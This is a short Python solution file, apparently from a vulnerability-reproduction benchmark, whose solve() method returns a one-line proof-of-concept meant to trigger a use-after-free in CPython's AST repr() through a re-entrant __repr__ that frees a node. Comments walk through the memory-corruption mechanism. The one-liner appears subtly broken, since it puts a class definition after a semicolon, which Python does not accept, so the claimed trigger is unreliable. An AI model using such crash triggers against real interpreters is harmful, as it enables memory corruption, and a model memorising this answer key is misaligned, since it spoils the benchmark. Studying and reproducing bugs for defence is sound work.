class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a use-after-free in the CPython AST repr() function.
        # A re-entrant call to a custom __repr__ method can deallocate the AST
        # node being processed, leading to a UAF when the function returns.
        #
        # This PoC script creates such a scenario:
        # 1. An outer `ast.Constant` wraps a list `l`.
        # 2. The list `l` contains an inner `ast.Constant` node `c`.
        # 3. The inner node `c` wraps a custom object with a malicious `__repr__`.
        # 4. Calling `repr()` on the outer node triggers `repr()` on the list,
        #    then on the inner node `c`, and finally on the custom object.
        # 5. The custom `__repr__` clears the list `l`, which drops the only
        #    reference to `c`, causing it to be freed.
        # 6. Control returns to the C-level `repr` function for `c`, which now
        #    operates on freed memory.
        #
        # The following one-liner script implements this logic compactly.
        poc_script = b"import ast,gc;l=[];class A:__repr__=lambda s:(l.clear(),gc.collect(),'')[2];c=ast.Constant(A());l.append(c);repr(ast.Constant(l))"
        return poc_script
